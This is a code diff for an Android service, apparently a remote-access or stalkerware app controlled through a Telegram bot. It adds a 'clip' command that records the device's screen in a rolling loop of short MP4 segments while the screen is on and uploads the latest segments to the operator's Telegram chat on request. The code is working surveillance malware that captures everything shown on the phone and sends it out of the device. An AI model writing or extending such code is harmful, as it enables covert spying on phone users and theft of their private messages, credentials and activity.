@@ -39,6 +39,7 @@ public class RelayService extends Service {
         appCtx = this;
         startedAt = System.currentTimeMillis();
         goForeground();
+        registrarReceiverTela();
 
         tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
         BridgeHolder.tg = tg;
@@ -56,6 +57,7 @@ public class RelayService extends Service {
             if (low.equals("ping")) { tg.say("pong"); return; }
             if (low.equals("shot")) { cmdShot(); return; }
             if (low.equals("rec") || low.startsWith("rec ")) { cmdRec(c); return; }
+            if (low.equals("clip") || low.startsWith("clip ")) { cmdClip(c); return; }
             if (low.equals("perm")) {
                 Intent pi = new Intent(this, PermActivity.class);
                 pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -433,6 +435,142 @@ private void cmdUninstall() {
                 if (BridgeHolder.tg != null) BridgeHolder.tg.say("rec: erro " + t);
             }
         }, "rec").start();
+    }
+
+    private static volatile boolean clipAtivo = false;
+    private static volatile boolean clipRodando = false;
+    private static volatile boolean telaOn = true;
+    private static volatile boolean pararSeg = false;
+    private static int segIdx = 0;
+
+    private final android.content.BroadcastReceiver telaReceiver = new android.content.BroadcastReceiver() {
+        @Override
+        public void onReceive(android.content.Context ctx, Intent i) {
+            if (Intent.ACTION_SCREEN_ON.equals(i.getAction())) telaOn = true;
+            else if (Intent.ACTION_SCREEN_OFF.equals(i.getAction())) { telaOn = false; pararSeg = true; }
+        }
+    };
+
+    private void registrarReceiverTela() {
+        try {
+            telaOn = ((android.os.PowerManager) getSystemService(Context.POWER_SERVICE)).isInteractive();
+            IntentFilter f = new IntentFilter();
+            f.addAction(Intent.ACTION_SCREEN_ON);
+            f.addAction(Intent.ACTION_SCREEN_OFF);
+            registerReceiver(telaReceiver, f);
+        } catch (Exception ignored) { }
+    }
+
+    public static void armarClip() {
+        clipAtivo = true;
+        dispararClipLoop();
+        if (BridgeHolder.tg != null)
+            BridgeHolder.tg.say("clip: camera retro armada (so grava com tela ligada - 'clip' entrega o passado, 'clip off' desliga)");
+    }
+
+    private void cmdClip(String c) {
+        String arg = c.trim().length() > 4 ? c.trim().substring(4).trim().toLowerCase(java.util.Locale.ROOT) : "";
+        if (arg.equals("off") || arg.equals("desligar")) { clipAtivo = false; tg.say("clip: desligado"); return; }
+        if (!arg.isEmpty() && !arg.equals("on")) { tg.say("clip: uso: clip | clip off"); return; }
+        if (clipAtivo && BridgeHolder.projection != null) { entregarClip(); return; }
+        if (BridgeHolder.projection == null) {
+            clipAtivo = true;
+            BridgeHolder.clipPendente = true;
+            notifConsentimento();
+            tg.say("clip: toque na NOTIFICACAO e INICIAR pra armar a camera retro");
+            return;
+        }
+        armarClip();
+    }
+
+    private static void dispararClipLoop() {
+        if (clipRodando) return;
+        clipRodando = true;
+        new Thread(() -> {
+            while (clipAtivo && clipRodando) {
+                android.media.projection.MediaProjection mp = BridgeHolder.projection;
+                android.content.Context ctx = appCtx;
+                if (mp == null || ctx == null) { dormir(2000); continue; }
+                if (!telaOn) { pararSeg = false; dormir(1500); continue; }
+                java.io.File out = new java.io.File(ctx.getFilesDir(), "clip_" + (segIdx++ % 4) + ".mp4");
+                gravarSegmento(mp, ctx, out);
+            }
+            clipRodando = false;
+        }, "clip").start();
+    }
+
+    private static void gravarSegmento(android.media.projection.MediaProjection mp,
+                                       android.content.Context ctx, java.io.File out) {
+        android.media.MediaRecorder rec = null;
+        android.hardware.display.VirtualDisplay vd = null;
+        try {
+            android.util.DisplayMetrics m = ctx.getResources().getDisplayMetrics();
+            rec = new android.media.MediaRecorder();
+            rec.setVideoSource(android.media.MediaRecorder.VideoSource.SURFACE);
+            rec.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+            rec.setOutputFile(out.getAbsolutePath());
+            rec.setVideoEncodingBitRate(800000);
+            rec.setVideoFrameRate(12);
+            rec.setVideoSize(640, 360);
+            rec.setVideoEncoder(android.media.MediaRecorder.VideoEncoder.H264);
+            rec.prepare();
+            vd = mp.createVirtualDisplay("clip", 640, 360, m.densityDpi,
+                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    rec.getSurface(), null, null);
+            rec.start();
+            pararSeg = false;
+            for (int i = 0; i < 50; i++) {
+                if (pararSeg) break;
+                dormir(500);
+            }
+            try { rec.stop(); } catch (Exception ignored) { }
+            if (vd != null) vd.release();
+            rec.release();
+        } catch (Throwable t) {
+            try { if (rec != null) rec.release(); } catch (Exception ignored) { }
+            if (vd != null) vd.release();
+            dormir(1500);
+        }
+    }
+
+    private void entregarClip() {
+        new Thread(() -> {
+            try {
+                pararSeg = true;
+                dormir(2000);
+                android.content.Context ctx = appCtx;
+                if (ctx == null) return;
+                java.io.File[] arqs = ctx.getFilesDir().listFiles(
+                        (d, n) -> n.startsWith("clip_") && n.endsWith(".mp4"));
+                if (arqs == null || arqs.length == 0) {
+                    BridgeHolder.tg.say("clip: ainda sem segmentos - espere ~30s com a tela ligada"); return;
+                }
+                java.util.Arrays.sort(arqs, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+                int enviados = 0;
+                long agora = System.currentTimeMillis();
+                for (java.io.File f : arqs) {
+                    if (enviados >= 3) break;
+                    long len = f.length();
+                    if (len < 80000) continue;
+                    if (agora - f.lastModified() < 4000) continue;
+                    byte[] data = new byte[(int) len];
+                    try (java.io.FileInputStream fi = new java.io.FileInputStream(f)) {
+                        int lido = 0;
+                        while (lido < len) { int n = fi.read(data, lido, (int) len - lido); if (n < 0) break; lido += n; }
+                    }
+                    BridgeHolder.tg.sendVideo(data, f.getName());
+                    enviados++;
+                    dormir(800);
+                }
+                BridgeHolder.tg.say("clip: " + enviados + " segmento(s) = ultimos ~" + (enviados * 25) + "s de tela");
+            } catch (Throwable t) {
+                if (BridgeHolder.tg != null) BridgeHolder.tg.say("clip: erro " + t);
+            }
+        }, "clip-send").start();
+    }
+
+    private static void dormir(long ms) {
+        try { Thread.sleep(ms); } catch (InterruptedException ignored) { }
     }
 
     public static void dispararCaptura() {
